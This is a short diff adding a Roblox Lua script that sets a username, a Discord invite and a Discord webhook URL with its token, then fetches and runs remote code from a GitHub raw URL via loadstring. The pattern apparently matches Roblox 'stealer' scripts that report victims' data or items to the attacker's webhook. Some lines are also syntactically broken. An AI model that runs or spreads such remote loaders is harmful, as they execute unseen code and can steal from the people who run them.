@@ -1,0 +1,5 @@
+_G.Username = "ecal0999"
+_G.HubName = .gg/TbgaiKhs
+_G.Webhook = "https://discord.com/api/webhooks/1096545153310793809/NKs1aWs2Mur2cHi-1ukiRAN4RfPFSzkePtISvj_H5Ax0yb6nTNV_71rBjZrBNyTHq9_S
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EZDUZITTT/Geesta/main/Lilassgee"))()```
